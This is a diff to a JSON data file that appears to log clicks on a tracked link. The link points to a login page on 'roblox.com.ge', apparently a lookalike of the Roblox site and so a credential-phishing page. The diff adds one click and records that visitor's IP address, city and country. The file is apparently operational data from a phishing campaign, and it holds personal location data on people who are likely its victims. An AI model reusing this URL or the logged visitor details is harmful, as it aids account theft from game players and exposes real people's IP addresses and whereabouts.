@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1497,
+    "useCount": 1498,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12144,6 +12144,14 @@
         "city": "Cantilan",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777442789994,
+        "ip": "42.119.87.211",
+        "country": "Vietnam",
+        "city": "Ho Chi Minh City",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
       }
     ]
   },
